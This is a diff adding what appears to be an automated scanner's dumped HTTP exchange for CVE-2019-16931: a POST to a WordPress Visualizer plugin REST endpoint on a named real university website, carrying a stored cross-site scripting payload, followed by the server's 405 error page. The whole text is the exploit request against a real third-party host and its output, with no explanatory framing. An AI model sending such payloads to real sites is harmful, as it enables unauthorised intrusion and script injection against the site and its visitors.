@@ -1,0 +1,42 @@
+[CVE-2019-16931] Dumped HTTP request for https://www.tbwl.esrc.unimelb.edu.au/wp-json/visualizer/v1/update-chart
+
+
+POST /wp-json/visualizer/v1/update-chart HTTP/1.1
+Host: www.tbwl.esrc.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Content-Length: 77
+Content-Type: application/json
+Accept-Encoding: gzip
+
+{"id": 7, "visualizer-chart-type": "<script>alert(document.domain)</script>"}
+[CVE-2019-16931] Dumped HTTP response https://www.tbwl.esrc.unimelb.edu.au/wp-json/visualizer/v1/update-chart
+
+HTTP/1.1 405 Method Not Allowed
+Connection: close
+Content-Length: 422
+Allow: GET, HEAD, OPTIONS
+Content-Type: text/html; charset=utf-8
+Date: Wed, 06 Aug 2025 15:19:00 GMT
+Server: AmazonS3
+Via: 1.1 4182a074185cd4c9b91519add9c7edf6.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: srqi33sR56eL7ZWTwO_v_RSa6afVEVmspDRvFQeFq4K8jZ2q4hmBgw==
+X-Amz-Cf-Pop: IAD55-P6
+X-Cache: Error from cloudfront
+
+<html>
+<head><title>405 Method Not Allowed</title></head>
+<body>
+<h1>405 Method Not Allowed</h1>
+<ul>
+<li>Code: MethodNotAllowed</li>
+<li>Message: The specified method is not allowed against this resource.</li>
+<li>Method: POST</li>
+<li>ResourceType: OBJECT</li>
+<li>RequestId: 39HXNH9PY4GKQDZP</li>
+<li>HostId: 9soAsRl9lsi8XJcLO0ZLDyshbWm1wrUHZW5LP8PkEsdNpwXCAC5+/htdjkyEsCDhylq2lTkEvqE=</li>
+</ul>
+<hr/>
+</body>
+</html>
+
